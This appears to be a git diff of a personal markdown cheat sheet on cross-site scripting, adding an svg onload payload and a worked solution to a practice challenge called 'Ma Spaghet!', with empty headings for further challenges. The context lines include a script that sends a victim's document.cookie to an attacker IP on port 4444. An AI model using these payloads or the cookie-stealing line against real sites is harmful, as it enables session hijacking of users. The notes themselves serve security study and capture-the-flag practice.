@@ -32,7 +32,28 @@ Malicious JS is stored in the webserver and served to the user upon request
 <script>alert(document.domain)</script>
 <!-- self firing -->
 <img src=x onerror=alert(1) />
+<svg onload=alert(1)></svg>
 <!-- 192.168.0.192 is hacker's IP and they are listening on port 4444, this lets them access the session cookie -->
 <script>new Image().src = "http://192.168.0.192:4444/hacker.php?output="+document.cookie;</script>
 
 ```
+
+## XSS Challenges
+### Ma Spaghet!
+```html
+<!-- Challenge -->
+<h2 id="spaghet"></h2>
+<script>
+    spaghet.innerHTML = (new URL(location).searchParams.get('somebody') || "Somebody") + " Toucha Ma Spaghet!"
+</script>
+<!-- Payload -->
+<!-- https://sandbox.pwnfunction.com/warmups/ma-spaghet.html?somebody=%3Csvg%20onload=alert(1)%3E -->
+<svg onload=alert(1)>
+```
+### Jefff
+### Ugandan Knuckles
+### Ricardo Milos
+### Ah That's Hawt 
+### Ligma
+### Mafia
+### Ok, Boomer
